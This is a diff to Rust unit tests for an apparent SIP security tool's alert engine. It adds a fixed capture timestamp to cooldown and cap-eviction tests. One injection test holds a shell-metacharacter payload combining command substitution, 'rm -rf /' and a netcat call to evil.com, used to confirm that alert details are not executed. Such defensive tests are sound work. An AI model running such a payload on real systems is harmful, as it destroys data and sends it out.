@@ -20,6 +20,13 @@ use sipnab::security::{FraudDetector, RegFloodDetector, ScannerDetector};
 // ── Helpers ─────────────────────────────────────────────────────────
 
 /// Loopback IPv4 address used as the default packet endpoint.
+/// A fixed capture time. The alert engine measures cooldowns and windows
+/// in packet time, so a test that wants "an immediate repeat" passes the
+/// same stamp twice rather than racing a wall clock.
+fn at_t() -> chrono::DateTime<chrono::Utc> {
+    chrono::DateTime::from_timestamp(1_700_000_000, 0).expect("valid timestamp")
+}
+
 fn localhost() -> IpAddr {
     IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1))
 }
@@ -422,7 +429,7 @@ fn alert_exec_no_injection_via_detail() {
     // Shell metacharacters that would execute if the detail were spliced into
     // the command string. No CR/LF, so log-sanitization leaves it byte-exact.
     let malicious = "$(id); rm -rf / `whoami` | nc evil.com 9";
-    let fired = engine.fire("test", localhost(), malicious);
+    let fired = engine.fire("test", localhost(), malicious, at_t());
     assert!(
         fired,
         "alert should fire (fresh (src, type), not in cooldown)"
@@ -863,11 +870,11 @@ fn alert_engine_caps_cooldown_entries() {
     // Control: a repeat fire of the same pair is suppressed (cooldown works).
     let mut control = new_engine();
     assert!(
-        control.fire("test", victim_ip(), "d"),
+        control.fire("test", victim_ip(), "d", at_t()),
         "first fire must fire"
     );
     assert!(
-        !control.fire("test", victim_ip(), "d"),
+        !control.fire("test", victim_ip(), "d", at_t()),
         "control: an immediate repeat must be suppressed, else the check is vacuous"
     );
 
@@ -875,16 +882,16 @@ fn alert_engine_caps_cooldown_entries() {
     // fill the map and evict the oldest (the victim).
     let mut engine = new_engine();
     assert!(
-        engine.fire("test", victim_ip(), "d"),
+        engine.fire("test", victim_ip(), "d", at_t()),
         "first fire must fire"
     );
     for ip in 1..=H4_CAP + 1 {
-        engine.fire("test", IpAddr::V4(Ipv4Addr::from(ip)), "d");
+        engine.fire("test", IpAddr::V4(Ipv4Addr::from(ip)), "d", at_t());
     }
     // A working cap evicted the victim, so it fires again; a regressed cap
     // would still hold its (hour-long) cooldown and suppress it.
     assert!(
-        engine.fire("test", victim_ip(), "d"),
+        engine.fire("test", victim_ip(), "d", at_t()),
         "cap regressed: victim cooldown survived the flood and stayed suppressed"
     );
 }
